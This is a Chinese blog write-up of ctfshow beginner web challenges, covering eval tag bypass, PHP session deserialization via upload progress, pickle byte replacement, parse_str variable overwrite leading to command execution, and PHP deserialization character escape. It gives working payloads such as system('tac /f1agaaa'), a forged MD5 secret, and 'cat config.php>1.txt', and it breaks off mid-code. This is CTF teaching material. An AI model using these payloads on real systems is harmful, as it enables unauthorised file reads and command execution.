---
title: "ctfshow-新手杯-web"
date: 2023-05-29T13:27:24+08:00
categories: ["ctfshow"]
---

# ctfshow-新手杯-web

## easy_eval

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

$code = $_POST['code'];

if(isset($code)){

  $code = str_replace("?","",$code);
  eval("?>".$code);

}
```

#### 题目分析

```
eval("?>".$code);将字符串$code的内容作为PHP代码进行解析和执行。
字符串"?>"表示PHP的结束标记，而$code是包含要执行的实际PHP代码的字符串。
?>将eval函数进行闭合，eval函数失去了作用，需要自己加php标签，输入过滤了问号，用javascript的标签来代替。
```

#### payload

```
POST:
code=<script language="php"> system("ls /"); </script>
code=<script language="php"> system("tac /f1agaaa"); </script>
```

## 剪刀石头布

**打开环境之后的页面**

![](/images/剪刀石头布-1.png)

**输入name以后进入的页面**

![](/images/剪刀石头布-2.png)

**题目源码**

```php
<?php
    ini_set('session.serialize_handler', 'php');
    if(isset($_POST['source'])){
        highlight_file(__FILE__);
    phpinfo();
    die();
    }
    error_reporting(0);
    include "flag.php";
    class Game{
        public $log,$name,$play;

        public function __construct($name){
            $this->name = $name;
            $this->log = '/tmp/'.md5($name).'.log';
        }

        public function play($user_input,$bot_input){
            $output = array('Rock'=>'&#9996;&#127995;','Paper'=>'&#9994;&#127995;','Scissors'=>'&#9995;&#127995;');
            $this->play = $user_input.$bot_input;
            if($this->play == "RockRock" || $this->play == "PaperPaper" || $this->play == "ScissorsScissors"){
                file_put_contents($this->log,"<div>".$output[$user_input].' VS '.$output[$bot_input]." Draw</div>\n",FILE_APPEND);
                return "Draw";
            } else if($this->play == "RockPaper" || $this->play == "PaperScissors" || $this->play == "ScissorsRock"){
                file_put_contents($this->log,"<div>".$output[$user_input].' VS '.$output[$bot_input]." You Lose</div>\n",FILE_APPEND);
                return "You Lose";
            } else if($this->play == "RockScissors" || $this->play == "PaperRock" || $this->play == "ScissorsPaper"){
                file_put_contents($this->log,"<div>".$output[$user_input].' VS '.$output[$bot_input]." You Win</div>\n",FILE_APPEND);
                return "You Win";
            }
        }

        public function __destruct(){
                echo "<h5>Game History</h5>\n";
        echo "<div class='all_output'>\n";
                echo file_get_contents($this->log);
        echo "</div>";
        }
    }

?>
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="icon.png">
    <title>Rock Paper Scissors</title>
    <!-- post 'source' to view something --> 
    <link rel="stylesheet" href="style.css">
</head>

<?php
    session_start();
    if(isset($_POST['name'])){
        $_SESSION['name']=$_POST['name'];
        $_SESSION['win']=0;
    }
    if(!isset($_SESSION['name'])){
        ?>
        <body>
            <h5>Input your name :</h5>
            <form method="post">
            <input type="text" class="result" name="name"></input>
            <button type="submit">submit</button>
            </form>
        </body>
        </html>
<?php exit();
    }

?>


<body>
<?php
echo "<h5>Welecome ".$_SESSION['name'].", now you win ".$_SESSION['win']." rounds.</h5>";
$Game=new Game($_SESSION['name']);
?>
    <h5>Make your choice :</h5>
    <form method="post">
    <button type="submit" value="Rock" name="choice">&#9996;&#127995;</button>
    <button type="submit" value="Paper" name="choice">&#9994;&#127995;</button>
    <button type="submit" value="Scissors" name="choice">&#9995;&#127995;</button>
    </form>

    <?php
    $choices = array("Rock", "Paper", "Scissors");
    $rand_bot = array_rand($choices);
    $bot_input = $choices[$rand_bot];
    if(isset($_POST["choice"]) AND in_array($_POST["choice"],$choices)){
        $user_input = $_POST["choice"];
        $result=$Game->play($user_input,$bot_input);
        if ($result=="You Win"){
            $_SESSION['win']+=1;
        } else {
            $_SESSION['win']=0;
        }
    } else {
        ?>
        <form method="post">
        <button class="flag" value="flag" name="flag">get flag</button>
        <button class="source" value="source" name="source">show source</button>
        </form>
        <?php
        if(isset($_POST["flag"])){
            if($_SESSION['win']<100){
                echo "<div>You need to win 100 rounds in a row to get flag.</div>";
            } else {
                echo "Here is your flag:".$flag;
            }

        }
    }
    ?>
</body>
</html>
```

#### 题目分析

**hint：我为啥要ini_set来着 hint2：php.ini配置的稀烂**

```php
ini_set('session.serialize_handler', 'php');
```

![](/images/剪刀石头布-3.png)

根据这两个不同的php处理器，php_serialize和php，可以实现session反序列化的构造

**关键类以及类中的关键函数**

```php
class Game
{
        public $log,$name,$play;

        public function __construct($name)
        {
            $this->name = $name;
            $this->log = '/tmp/'.md5($name).'.log';
        }

        public function __destruct()
        {
        	echo "<h5>Game History</h5>\n";
        	echo "<div class='all_output'>\n";
        	echo file_get_contents($this->log);
        	echo "</div>";
        }
}
```

观察到__destruct()函数的echo file_get_contents($this->log);，由源码中发现include "flag.php";，可以将$log赋值为/var/www/html/flag.php

```php
<?php

class Game
{
	public $log;
    public function __construct()
    {
        $this->log = "/var/www/html/flag.php";
    }
}
$a = new Game();
echo serialize($a);

?>
# 输出结果：O:4:"Game":1:{s:3:"log";s:22:"/var/www/html/flag.php";}
# 加一个|：|O:4:"Game":1:{s:3:"log";s:22:"/var/www/html/flag.php";}
```

在php处理器php_serialize的处理下，存储该序列化字符串，|(管道符)只是一个普通字符，但是php处理器php的处理下，读取该序列化字符串， |(管道符)被作为分割键名和键值的分割线，所以|后面的内容会被反序列化。

观察代码会发现源码是没有$_SESSION变量赋值但符合使用不同的引擎来处理session文件，所以使用php中的upload_process机制。

#### 知识点

##### file_get_contents() 函数

file_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。

##### 什么是session？

session：会话控制。session对象存储特定用户会话所需的属性及配置信息。

当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。

##### session工作流程

当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。

当同一个用户再次访问这个网站时，会自动通过HTTP的请求头将Cookie中保存的Seesion ID再次携带，Session_start()函数不会再分配新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将之前为这个用户保存的会话信息读取出来。

##### session_start()作用

当会话自动开始或利用session_start()手动开始， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并填充到 $_SESSION 超级全局变量中。

如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。

##### php.ini中关于session的相关配置

```
session.save_path="" //设置session的存储路径
session.save_handler="" //设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start boolen //指定会话模块是否在请求开始时启动一个会话默认为0不启动
session.serialize_handler string //定义用来序列化/反序列化的处理器名字。默认使用php
```

##### session机制对序列化的三种不同处理器

```
php_binary
存储方式：键名长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值

php
存储方式：键名+竖线+经过serialize()函数序列处理的值

php_serialize(php>5.5.4)
存储方式：经过serialize()函数序列化处理的值
```

实例

```php
<?php
ini_set('session.serialize_handler', 'php');
//ini_set("session.serialize_handler", "php_serialize");
//ini_set("session.serialize_handler", "php_binary");
session_start();
$_SESSION['lemon'] = $_GET['a'];
echo "<pre>";
var_dump($_SESSION);
echo "</pre>";
?>
```

```
php : lemon|s:3:"abc";
php_serialize : a:1:{s:5:"lemon";s:3:"abc";}
php_binary : lemons:3:"abc";
```

##### session反序列化漏洞成因

不同的引擎对|（管道符）会有不同的处理，php_binary或者php_serialize都不会识别|，而且对输入的具体值不会当成一个由对象序列化的字符串来反序列化，而是直接把输入的字符串当成一个具体的值来反序列化。然而php会把|后的字符串当成一个由对象序列化的字符串来反序列化。

为什么在解析session文件时，php直接对'|'后的值进行反序列化处理？

> 当会话自动开始或者通过session_start()手动开始的时候，php内部会调用会话管理器的open和read回调函数。会话管理器可能是php默认的，也可能是扩展提供的（SQLite 或者 Memcached扩展），也可能是通过session_set_save_handler()设定的用户自定义会话管理器。通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），php会自动反序列化数据并填充$_SESSION超级全局变量。

##### upload_process机制

没有$_SESSION变量赋值,怎么解决？

php存在一个upload_process机制，即自动在$_SESSION中创建一个键值对，值中刚好存在用户可控的部分。

写入的方式主要是利用PHP中Session Upload Progress来进行设置，具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中。

参考资料：[session反序列化](https://www.cnblogs.com/zzjdbk/p/12995217.html)

#### payload

##### session文件上传脚本（这里我上传了一个空的text文件）

```html
<!doctype html>
<html>
<body>
<form action="http://8975c3dd-0e68-4b58-a425-abdf4c9f5da4.challenge.ctf.show/" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
 	<input type="file" name="file" />
    <input type="submit" />
</form>
</body>
</html>
```

##### 序列化字符串

```
|O:4:"Game":1:{s:3:"log";s:22:"/var/www/html/flag.php";}
```

filename改为单引号，直接将文件名内容改为序列化字符串。

![](/images/剪刀石头布-4.png)

filename仍然是双引号，将序列化字符串中的双引号进行转义。

![](D:\HugoWebsite\R1one\Blog\static\images\剪刀石头布-5.png)

## baby_pickle

**打开环境后的页面显示**

```
欢迎来到新手村new_rookie
只有成为大菜鸡才能得到flag
```

**题目附件源码**

```python
# Author:
#   Achilles
# Time:
#   2022-9-20
# For:
#   ctfshow
import base64
import pickle, pickletools
import uuid
from flask import Flask, request

app = Flask(__name__)
id = 0
flag = "ctfshow{" + str(uuid.uuid4()) + "}"

class Rookie():
    def __init__(self, name, id):
        self.name = name
        self.id = id


@app.route("/")
def agent_show():
    global id
    id = id + 1

    if request.args.get("name"):
        name = request.args.get("name")
    else:
        name = "new_rookie"

    new_rookie = Rookie(name, id)
    try:
        file = open(str(name) + "_info", 'wb')
        info = pickle.dumps(new_rookie, protocol=0)
        info = pickletools.optimize(info)
        file.write(info)
        file.close()
    except Exception as e:
        return "error"

    with open(str(name)+"_info", "rb") as file:
        user = pickle.load(file)

    message = "<h1>欢迎来到新手村" + user.name + "</h1>\n<p>" + "只有成为大菜鸡才能得到flag" + "</p>"
    return message


@app.route("/dacaiji")
def get_flag():
    name = request.args.get("name")
    with open(str(name)+"_info", "rb") as f:
        user = pickle.load(f)

    if user.id != 0:
        message = "<h1>你不是大菜鸡</h1>"
        return message
    else:
        message = "<h1>恭喜你成为大菜鸡</h1>\n<p>" + flag + "</p>"
        return message


@app.route("/change")
def change_name():
    name = base64.b64decode(request.args.get("name"))
    newname = base64.b64decode(request.args.get("newname"))

    file = open(name.decode() + "_info", "rb")
    info = file.read()
    print("old_info ====================")
    print(info)
    print("name ====================")
    print(name)
    print("newname ====================")
    print(newname)
    info = info.replace(name, newname)
    print(info)
    file.close()
    with open(name.decode()+ "_info", "wb") as f:
        f.write(info)
    return "success"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

#### 题目分析

```php
# 关键代码：
    if user.id != 0:
        message = "<h1>你不是大菜鸡</h1>"
        return message
    else:
        message = "<h1>恭喜你成为大菜鸡</h1>\n<p>" + flag + "</p>"
        return message
```

这里要想得到flag，需要成为大菜鸡，就是需要id=0

```php
@app.route("/change")
def change_name():
    name = base64.b64decode(request.args.get("name"))
    newname = base64.b64decode(request.args.get("newname"))

    file = open(name.decode() + "_info", "rb")
    info = file.read()
    print("old_info ====================")
    print(info)
    print("name ====================")
    print(name)
    print("newname ====================")
    print(newname)
    info = info.replace(name, newname)
    print(info)
    file.close()
    with open(name.decode()+ "_info", "wb") as f:
        f.write(info)
    return "success"
```

这段代码，我们name的值是可控的，可以先本地跑一下，看有没有什么发现。

本地运行，并且/?name=123，发现生成了123_info文件，内容如下：

```
ccopy_reg
_reconstructor
(c__main__
Rookie
c__builtin__
object
NtR(dVname
V123
sVid
I2
sb.
```

```
可以看到I2，应该是id=2，
sb.可相当于结束序列化流程的一个标志。

这里联想到php反序列化字符逃逸。
sb.就类似于;}，name就是我们的可控变量。

我们的目标是id=0，这里需要被丢弃的为
sVid
I2
sb.
那么name的值就该为
123
sVid
I0
sb.
这样构造，相当于间接更改了id的值。那么直接在/change路由对name进行改值就可以啦。
```

官方wp也有一个思路

```
观察id为0和1的序列化字节有什么不同

print(pickletools.optimize(pickle.dumps(Rookie("aaa",0),protocol=0)))
print(pickletools.optimize(pickle.dumps(Rookie("aaa",1),protocol=0)))

b'ccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVaaa\nsVid\nI0\nsb.'
b'ccopy_reg\n_reconstructor\n(c__main__\nRookie\nc__builtin__\nobject\nNtR(dVname\nVaaa\nsVid\nI1\nsb.'

从而可以想到利用php反序列化字符逃逸的做法。
```

#### 知识点

##### php反序列化特点

- php在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾，并且是根据长度判断内容 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 ，超出的部分并不会被反序列化成功，这说明反序列化的过程有一定识别范围，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。反序列化字符串都是以";}结束，如果把";}添入到需要反序列化的字符串中，就能让反序列化提前闭合结束，后面的内容就会丢弃。
- 长度不对应会报错。

##### PHP反序列化字符逃逸

- **漏洞成因**：代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）。

- **漏洞条件**：序列化后过滤再进行反序列化

- **两种情况**：过滤后字符变多、过滤后字符变少

- **二者区别**：

  字符串增加：构造的序列化语句和过滤的值在同一个变量
  字符串减少：构造的序列化语句和过滤的值不在同个变量里
  字符串增加：构造过滤的值的个数就是构造的序列化语句的字符串的字符个数
  字符串减少：构造过滤的值的个数是下一个可控变量的字符串的字符个数

##### 字符串增加实例

目标：将isVIP变量的值修改为1

```php
<?php
class user
{
    public $username;
    public $password;
    public $isVIP;
    
    public function __construct($u,$p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

$a = new user("admin","123456");
$a_seri = serialize($a);

echo $a_seri;
?>
```

```
输出结果：
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

增加一个对admin字符进行替换的函数，将admin替换为hacker

```php
<?php
class user
{
    public $username;
    public $password;
    public $isVIP;
    
    public function __construct($u,$p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s)
{
    return str_replace("admin","hacker",$s);
}

$a = new user("admin","123456");
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

```
输出结果：
O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

```
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}  // 未过滤
O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} // 已过滤
已过滤字符串中的hacker与前面的字符长度不对应，此时，新建对象，则传入的admin就是可控变量
```

目标字串和现有字串比较

```
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}	// 现有子串
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}	// 目标子串，长度为47

需要在admin这个可控变量的位置，注入目标子串。因为需要逃逸的目标字串长度为47，并且admin每次过滤后都会变成hacker，即每出现一次admin，就会多1个字符。因此需要在可控变量处重复47遍admin，并加上逃逸后的目标子串。
```

```php
<?php
class user
{
	public $username;
	public $password;
	public $isVIP;

	public function __construct($u,$p)
	{
		$this->username = $u;
		$this->password = $p;
		$this->isVIP = 0;
	}
}

function filter($s)
{
	return str_replace("admin","hacker",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

```
输出结果：
O:4:"user":3:{s:8:"username";s:282:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}

一共是47个hacker，共282个字符，正好与前面282相对应，后面的注入子串也完成了逃逸。反序列化后，最后面的多余子串直接抛弃。
```

将序列化结果再反序列化之后，输出检查

```php
<?php
class user
{
	public $username;
	public $password;
	public $isVIP;

	public function __construct($u,$p)
	{
		$this->username = $u;
		$this->password = $p;
		$this->isVIP = 0;
	}
}

function filter($s)
{
	return str_replace("admin","hacker",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);
$a_seri_filter_unseri = unserialize($a_seri_filter);

var_dump($a_seri_filter_unseri);
?>
```

```
输出结果：
object(user)#2 (3) {
  ["username"]=>
  string(282) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
  ["password"]=>
  string(6) "123456"
  ["isVIP"]=>
  int(1)
}
```

##### 字符串较少实例

目标：将isVIP变量的值修改为1

增加对admin字符进行替换的函数，将admin替换为hack

```php
<?php
class user
{
	public $username;
	public $password;
	public $isVIP;

	public function __construct($u,$p)
	{
		$this->username = $u;
		$this->password = $p;
		$this->isVIP = 0;
	}
}

function filter($s)
{
	return str_replace("admin","hack",$s);
}

$a = new user('admin','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

```
输出结果：
O:4:"user":3:{s:8:"username";s:5:"hack";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

目标字串和现有字串比较

```
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}	// 现有子串
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}	// 目标子串，长度为47
";s:8:"password";s:6:" //下一个可控变量字符串，长度为22
因为过滤时，admin变为hack，每出现一次admin，就会减少一个字符，和上面字符变多的情况相反，随着admin的数量增多，现有子串后面会逐渐缩短。
因为每次过滤的时候都会少1个字符，因此将admin字符重复22遍，使得下一个可控变量字符串（这里的22遍并不一定准确，因为有双引号的干扰）
```

```php
<?php
class user
{
	public $username;
	public $password;
	public $isVIP;

	public function __construct($u,$p)
	{
		$this->username = $u;
		$this->password = $p;
		$this->isVIP = 0;
	}
}

function filter($s)
{
	return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

```
输出结果：
O:4:"user":3:{s:8:"username";s:110:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}

s后面是110，需要读取到110个字符
从第一个引号开始，110个字符如下：
hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:6:"

123456这个位置变成可控变量，在这里添加目标子串";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}
```

> **注意：**
>
> PHP反序列化的机制：不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量读取字符串。
>
> 例如，前面是规定了有10个字符，但是只读到了9个就到了双引号，此时PHP会把双引号当做第10个字符。

```php
<?php
class user
{
	public $username;
	public $password;
	public $isVIP;

	public function __construct($u,$p)
	{
		$this->username = $u;
		$this->password = $p;
		$this->isVIP = 0;
	}
}

function filter($s)
{
	return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

```
输出结果：
O:4:"user":3:{s:8:"username";s:110:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}

hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"
此段字符长度为111
原因：替换之前目标子串的位置是123456，一共6个字符，替换之后目标子串47个字符，会造成计算的payload不准确
解决办法：多添加1个admin，补上缺少的字符。
```

```php
<?php
class user
{
	public $username;
	public $password;
	public $isVIP;

	public function __construct($u,$p)
    {
		$this->username = $u;
		$this->password = $p;
		$this->isVIP = 0;
	}
}

function filter($s)
{
	return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

```
输出结果：
O:4:"user":3:{s:8:"username";s:115:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

将序列化结果再反序列化之后，输出检查

```php
<?php
class user
{
	public $username;
	public $password;
	public $isVIP;

	public function __construct($u,$p)
    {
		$this->username = $u;
		$this->password = $p;
		$this->isVIP = 0;
	}
}

function filter($s)
{
	return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);
$a_seri_filter_unseri = unserialize($a_seri_filter);

var_dump($a_seri_filter_unseri);
?>
```

```
输出结果：
object(user)#2 (3) {
  ["username"]=>
  string(115) "hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:""
  ["password"]=>
  string(6) "123456"
  ["isVIP"]=>
  int(1)
}
```

参考资料：[PHP反序列化字符逃逸详解](https://baijiahao.baidu.com/s?id=1708960496312008602&wfr=spider&for=pc)

#### payload

```
name：new_rookie
base64编码：bmV3X3Jvb2tpZQ==

newname：
new_rookie
sVid
I0
sb.
base64编码：bmV3X3Jvb2tpZQpzVmlkCkkwCnNiLg==

/change?name=bmV3X3Jvb2tpZQ==&newname=bmV3X3Jvb2tpZQpzVmlkCkkwCnNiLg==
/dacaiji?name=new_rookie

注意：name不可以随便给，题目环境的name是new_rookie
```

## repairman

```
URL：
http://cc7958e5-7762-44cc-8332-7fd11130ad36.challenge.ctf.show/index.php?mode=1

页面内容：
hello,the user!We may change the mode to repaie the server,please keep it unchanged
```

#### 题目分析

根据题目提示，让mode=0，发现回显了源码

```php
Your mode is the guest!hello,the repairman! <?php
error_reporting(0);
session_start();
$config['secret'] = Array();
include 'config.php';
if(isset($_COOKIE['secret'])){
    $secret =& $_COOKIE['secret'];
}else{
    $secret = Null;
}

if(empty($mode)){
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query']);
    if(empty($mode)) {
        echo 'Your mode is the guest!';
    }
}

function cmd($cmd){
    global $secret;
    echo 'Sucess change the ini!The logs record you!';
    exec($cmd);
    $secret['secret'] = $secret;
    $secret['id'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['secret'] = $secret;
}

if($mode == '0'){
    //echo var_dump($GLOBALS);
    if($secret === md5('token')){
        $secret = md5('test'.$config['secret']);
        }

        switch ($secret){
            case md5('admin'.$config['secret']):
                echo 999;
                cmd($_POST['cmd']);
            case md5('test'.$config['secret']):
                echo 666;
                $cmd = preg_replace('/[^a-z0-9]/is', 'hacker',$_POST['cmd']);
                cmd($cmd);
            default:
                echo "hello,the repairman!";
                highlight_file(__FILE__);
        }
    }elseif($mode == '1'){
        echo '</br>hello,the user!We may change the mode to repaie the server,please keep it unchanged';
    }else{
        header('refresh:5;url=index.php?mode=1');
        exit;
    }
```

**关键代码1**：

```php
if($mode == '0')
{
    //echo var_dump($GLOBALS);
    if($secret === md5('token'))
    {
        $secret = md5('test'.$config['secret']);
    }
        switch ($secret)
        {
            case md5('admin'.$config['secret']):
                echo 999;
                cmd($_POST['cmd']);
            case md5('test'.$config['secret']):
                echo 666;
                $cmd = preg_replace('/[^a-z0-9]/is', 'hacker',$_POST['cmd']);
                cmd($cmd);
            default:
                echo "hello,the repairman!";
                highlight_file(__FILE__);
        }
```

```
通过分析上面的代码，发现要想拿到flag，进入admin的分支，来执行命令，因为test分支只能通过字母数字执行命令，这貌似是不可能的。因此就需要让$secret = md5('admin'.$config['secret'])。
secret变量完全可控，
if(isset($_COOKIE['secret'])){ ... }
如果存在名为 secret 的 cookie，则将 $_COOKIE['secret'] 的引用赋值给 $secret 变量。
只是$config['secret']目前还不知道怎么赋值。
```

**关键代码2**：

```php
if(empty($mode)){
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query']);
    if(empty($mode)) {
        echo 'Your mode is the guest!';
    }
}
```

```
$url = parse_url($_SERVER['REQUEST_URI']);
parse_str($url['query']);

这里举个例子更好说明
例如，用户正在访问的 URL 是 https://example.com/path/to/page.php?param=value
$_SERVER['REQUEST_URI'] 的值是 /path/to/page.php?param=value。

$url = parse_url($_SERVER['REQUEST_URI']);：
parse_url() 函数用于解析 URL，并返回一个关联数组，其中包含 URL 的各个组成部分。
通过 parse_url() 函数对$_SERVER['REQUEST_URI']进行解析。
解析后的结果存储在变量 $url 中，是一个关联数组。
$url的值是
Array (
    [path] => /path/to/page.php
    [query] => param1=value1&param2=value2
)

parse_str($url['query']);
parse_str() 函数用于将查询字符串解析为变量，并将其设置为当前符号表的条目。
其对 $url['query'] 进行解析，并将解析后的参数和值设置为当前符号表中的变量。
解析后的结果：
$param1 = 'value1';
$param2 = 'value2';
```

```
所以通过parse_url和parse_str这两个关键函数，可以对$config['secret']进行变量覆盖。
```

#### 知识点

##### $_SERVER['REQUEST_URI']

$_SERVER['REQUEST_URI'] 是 PHP 中的一个预定义变量，用于存储当前请求的 URI（Uniform Resource Identifier），即请求的完整 URL 路径。

##### URL和URI的区别？

- URL的作用

  URL一般是一个完整的链接，我们可以直接通过这个链接（URL）访问到一个网站，或者把这个URL复制到浏览器访问网站。

  使用URL时我们就是一个直接用户的角色，直接访问就可以。

- URI的作用

  URI并不是一个直接访问的链接，而是相对地址（相对于浏览器，URI等同于URL）。这种概念更多用于编程中，因为我们没必要每次编程都用绝对url来获取页面，这样还需要进行分割“http://xx/xxx”前面那一串，所以编程的时候直接request.getRequestURI就行了，如果重定向，需要用URL。

- URL继承了所有URI的内容，所以它比URI更加详细，但是URI是URL的父级。

##### PHP parse_url函数

语法：

```
parse_url(string $url, int $component = -1): mixed
```

参数：

```
$url：要解析的 URL 字符串。
$component（可选）：用于指定返回结果中包含的部分。可以是以下常量之一：
PHP_URL_SCHEME：返回协议（例如 http、https）。
PHP_URL_HOST：返回主机名。
PHP_URL_PORT：返回端口号。
PHP_URL_USER：返回用户名。
PHP_URL_PASS：返回密码。
PHP_URL_PATH：返回路径部分。
PHP_URL_QUERY：返回查询字符串部分。
PHP_URL_FRAGMENT：返回片段标识符（也称为锚点）部分。
默认值为 -1，表示返回包含所有部分的关联数组。
```

返回值：

如果解析成功，将返回一个关联数组，包含 URL 的各个组成部分。
如果解析失败，将返回 false。

##### PHP parse_str() 函数

- parse_str() 函数把查询字符串解析到变量中。
- 注：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。
- 注：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。

##### PHP exec()函数

exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。

#### payload

```
GET: /index.php?mode=0&config[secret]=r1one&secret=40234cce895a7b3058d4a4c241ae26d7
// MD5(adminr1one)：40234cce895a7b3058d4a4c241ae26d7
POST: cmd=cat config.php>1.txt
然后访问1.txt
这里关于secret的值，
可以单独设置Cookie:secret=40234cce895a7b3058d4a4c241ae26d7
也可以直接利用URL进行GET传参
因为，如果Cookie没有设置secret的值，secret为空，经过parse_str，进行变量覆盖，也会有值。
```

## 简单的数据分析

打开页面，发现

![](/images/简单的数据分析-1.png)

```
访问http://49aa75ee-ea3f-4e12-b75f-ae589cf98959.challenge.ctf.show/source/model.txt得到源码
```

```python
D = random.randint(100, 200)
pData = [numpy.random.random(D)*100,numpy.random.random(D)*100,numpy.random.random(D)*100]

try:
    data = request.form.getlist('data[]')
    data = list(map(float,data))
    data = numpy.array(data)
except:
    msg="数据转换失败"

try:
